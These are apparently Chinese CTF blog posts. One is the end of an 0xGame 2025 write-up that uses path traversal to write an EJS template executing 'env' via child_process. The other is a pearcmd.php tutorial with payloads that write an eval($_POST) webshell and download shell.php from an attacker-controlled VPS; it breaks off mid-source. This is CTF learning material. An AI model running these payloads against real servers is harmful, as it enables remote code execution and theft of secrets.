<p>通过这个获得a的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;&quot;</span> <span class="comment">#&#123;&#125;内的</span></span><br><span class="line">key = key.encode()</span><br><span class="line">key = <span class="built_in">int</span>.from_bytes(key, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">pa = uuid.uuid8(a=key)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment">#a=183915192278352122275137263475187826728085592578452428749304943</span></span><br></pre></td></tr></table></figure>

<p>现在还缺b和c，扫一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[23:46:52] Starting:                                                         </span><br><span class="line">[23:47:14] 200 -   76B  - /auth                                             </span><br><span class="line">[23:47:22] 301 -   48B  - /debug/pprof  -&gt;  /debug/pprof/                   </span><br><span class="line">[23:47:22] 200 -    3KB - /debug/pprof/</span><br><span class="line">[23:47:22] 200 -   12KB - /debug/pprof/goroutine?debug=1                    </span><br><span class="line">[23:47:22] 200 -   35KB - /debug/pprof/heap</span><br><span class="line">[23:47:23] 200 -   59KB - /debug/pprof/trace                                </span><br><span class="line">[23:47:27] 200 -   65B  - /health                                           </span><br><span class="line">[23:47:33] 200 -    4KB - /login</span><br><span class="line">[23:47:35] 200 -  128B  - /metrics</span><br><span class="line">[23:47:41] 200 -    2B  - /ping</span><br><span class="line">[23:47:43] 200 -    5KB - /register</span><br><span class="line">[23:47:52] 200 -    4KB - /user</span><br></pre></td></tr></table></figure>

<p>&#x2F;athu发现c和b</p>
<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/7a57ebb8-a07f-4ee8-8b85-e894a9a8ad88-20251110201400-xhzs4la.png" class="" title="web2解题过程截图">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import uuid</span><br><span class="line">key = <span class="string">&quot;rsaisfunbutisitweborcrypto&quot;</span> </span><br><span class="line">key = key.encode()</span><br><span class="line">key = int.from_bytes(key, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">pa = uuid.uuid8(a=key)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(uuid.uuid8(a=key ,b=120604030108,c=7430469441))</span><br><span class="line"></span><br><span class="line"><span class="comment">#183915192278352122275137263475187826728085592578452428749304943</span></span><br><span class="line"><span class="comment">#63727970-746f-849c-8000-0001bae3f741</span></span><br></pre></td></tr></table></figure>

<p>admin登入后查看env即可</p>
<h2 id="这真的是文件上传"><a href="#这真的是文件上传" class="headerlink" title="这真的是文件上传"></a>这真的是文件上传</h2><p>先看源码吧</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//original-author: gtg2619</span></span><br><span class="line"><span class="comment">//adapt: P</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">limit</span>: <span class="string">&#x27;114514mb&#x27;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATIC_DIR</span> = __dirname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">serveIndex</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// Useless Check , So It&#x27;s Easier</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> whilePath = [<span class="string">&#x27;index&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> templ = req.<span class="property">query</span>.<span class="property">templ</span> || <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!whilePath.<span class="title function_">includes</span>(templ))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Denied Templ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lsPath = path.<span class="title function_">join</span>(__dirname, req.<span class="property">path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(templ, &#123;</span><br><span class="line">            <span class="attr">filenames</span>: fs.<span class="title function_">readdirSync</span>(lsPath),</span><br><span class="line">            <span class="attr">path</span>: req.<span class="property">path</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">path</span> !== <span class="string">&#x27;string&#x27;</span> || </span><br><span class="line">            (<span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;string&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="literal">null</span>)</span><br><span class="line">        ) res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/js$|\.\./i</span>.<span class="title function_">test</span>(req.<span class="property">path</span>)) res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Denied filename&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">path</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;/&#x27;</span>)) <span class="title function_">serveIndex</span>(req, res);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Why Filepath Not Check ?</span></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="variable constant_">STATIC_DIR</span>, req.<span class="property">path</span>);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">writeFile</span>(filePath, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(req.<span class="property">body</span>.<span class="property">content</span>, <span class="string">&#x27;base64&#x27;</span>), <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`running on port 80`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们分析分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">path</span> !== <span class="string">&#x27;string&#x27;</span> || </span><br><span class="line">            (<span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;string&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="literal">null</span>)</span><br><span class="line">        ) res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/js$|\.\./i</span>.<span class="title function_">test</span>(req.<span class="property">path</span>)) res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Denied filename&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">path</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;/&#x27;</span>)) <span class="title function_">serveIndex</span>(req, res);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里过滤了js结尾和..的目录穿越，能用&#x2F;.绕过，就比如在所有类 Unix 系统（包括 Linux、macOS）以及 Windows 中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. 表示 当前目录</span><br><span class="line">.. 表示 父目录</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/a/b</span><br><span class="line">$ <span class="built_in">ls</span> .</span><br><span class="line"><span class="comment"># 等价于 ls /a/b</span></span><br></pre></td></tr></table></figure>

<p>所以路径中的 <code>/a/b/.</code> 意思是，进入 &#x2F;a，再进入 b，然后进入 当前目录（也就是 b 自己）</p>
<p>然后我们看看</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">serveIndex</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// Useless Check , So It&#x27;s Easier</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> whilePath = [<span class="string">&#x27;index&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> templ = req.<span class="property">query</span>.<span class="property">templ</span> || <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!whilePath.<span class="title function_">includes</span>(templ))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Denied Templ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lsPath = path.<span class="title function_">join</span>(__dirname, req.<span class="property">path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(templ, &#123;</span><br><span class="line">            <span class="attr">filenames</span>: fs.<span class="title function_">readdirSync</span>(lsPath),</span><br><span class="line">            <span class="attr">path</span>: req.<span class="property">path</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这边能渲染index，传个?temp&#x3D;…就行了</p>
<p>写了是view的话，目录就是&#x2F;views&#x2F;index.ejs&#x2F;.</p>
<p>我们整个页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SSTI Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Server Environment<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    &lt;%= process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;).toString() %&gt;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/views/index.ejs/.</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>nc1.ctfplus.cn:11304</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>370</span><br><span class="line">Content-Type:application/json</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;<span class="attribute">content</span>&quot;:<span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDx0aXRsZT5TU1RJIEV4YW1wbGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogIDxoMj5TZXJ2ZXIgRW52aXJvbm1lbnQ8L2gyPgogIDxocj4KICA8dWw+CiAgICA8JT0gcHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnZW52JykudG9TdHJpbmcoKSAlPgogIDwvdWw+CiAgPGhyPgo8L2JvZHk+CjwvaHRtbD4K&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后访问&#x2F;views&#x2F;?templ&#x3D;index就行了</p>
<h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>依旧是熟悉的总结，这次拖的更久了，怎么回事，必须鞭策一下自己了</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于pearcmd.php的利用</title>
    <url>/2025/11/23/%E5%85%B3%E4%BA%8Epearcmd.php%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="关于pearcmd-php的利用"><a href="#关于pearcmd-php的利用" class="headerlink" title="关于pearcmd.php的利用"></a>关于pearcmd.php的利用</h1><p>复现lilctf时遇到了，突然发现自己缺了这块的知识，所以写了这篇</p>
<h3 id="PECL"><a href="#PECL" class="headerlink" title="PECL"></a>PECL</h3><p>PECL 的全称是 The PHP Extension Community Library ，是一个开放的并通过 PEAR(PHP Extension and Application Repository，PHP 扩展和应用仓库)打包格式来打包安装的 PHP 扩展库仓库，<strong>在docker中默认安装，路径为&#x2F;user&#x2F;local&#x2F;lib&#x2F;php.</strong></p>
<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>register_argc_argv=On</p>
<p>当该选项开启时（Docker 的 PHP 镜像中默认为 On），PHP 会将 HTTP 请求中的 URL 问号后面的内容注册为全局变量 $argc（参数个数）和 $argv（参数数组）。</p>
<p>我们可以测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;register_argc_argv: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;register_argc_argv&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;GET\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;无 GET 参数\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Argv\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未找到\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<img src="/2025/11/23/%E5%85%B3%E4%BA%8Epearcmd.php%E7%9A%84%E5%88%A9%E7%94%A8/64654e73-159f-4cd3-be91-13eb474a5e3d-20251124225232-u5jbe9o.png" class="" title="测试">

<p>发现一个有趣的好像只有+号能分割参数</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当我们文件包含<code>pearcmd.php</code>​时，<code>pearcmd.php</code>​会读取register_argc_argv开启时的全局变量<code>$_SERVER[&#39;argv&#39;]</code>，变成其的命令参数，然后执行pear命令</p>
<p>pear参数挺多的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br></pre></td></tr></table></figure>

<h5 id="1-config-create"><a href="#1-config-create" class="headerlink" title="1.config-create"></a>1.config-create</h5><p>这个方法有两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pear config-create &lt;root_path&gt; &lt;file_path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?+config-creater+/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/hello.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=phpinfo()?&gt;+/tmp/test.php </span><br></pre></td></tr></table></figure>

<h5 id="2-利用-install或者download远程下载"><a href="#2-利用-install或者download远程下载" class="headerlink" title="2.利用 install或者download远程下载"></a>2.利用 install或者download远程下载</h5><h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>

<p>利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/shell.php</span><br><span class="line">或者</span><br><span class="line">/?file=/usr/local/lib/php/peclcmd.php&amp;+install+http://vps/shell.php</span><br></pre></td></tr></table></figure>

<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pear download [option] [package]</span><br></pre></td></tr></table></figure>

<p>利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?+download+file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php&amp;</span><br><span class="line">或者</span><br><span class="line">/?file=/usr/local/lib/php/peclcmd.php&amp;+download+http://vps/1.php</span><br></pre></td></tr></table></figure>

<h4 id="当pearcmd关键词被ban，可以用peclcmd-php作为平替"><a href="#当pearcmd关键词被ban，可以用peclcmd-php作为平替" class="headerlink" title="当pearcmd关键词被ban，可以用peclcmd.php作为平替"></a>当pearcmd关键词被ban，可以用peclcmd.php作为平替</h4><h3 id="例题的话LilCTF2025（Your-Uns3r）"><a href="#例题的话LilCTF2025（Your-Uns3r）" class="headerlink" title="例题的话LilCTF2025（Your Uns3r）"></a>例题的话LilCTF2025（Your Uns3r）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;value, <span class="string">&#x27;S:&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;value));</span><br><span class="line">            <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ser</span> != <span class="variable language_">$this</span>-&gt;value &amp;&amp; <span class="variable">$instance</span> <span class="keyword">instanceof</span> Access) &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">getToken</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;wanna ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Access</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$prefix</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;prefix) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;suffix)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Go to HELL!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;prefix . <span class="string">&#x27;lilctf&#x27;</span> . <span class="variable language_">$this</span>-&gt;suffix;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$result</span>, <span class="string">&#x27;pearcmd&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Can I have peachcmd?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$ser</span>, <span class="string">&#x27;admin&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$ser</span>, <span class="string">&#x27;Access&quot;:&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span> (<span class="string">&quot;no way!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span 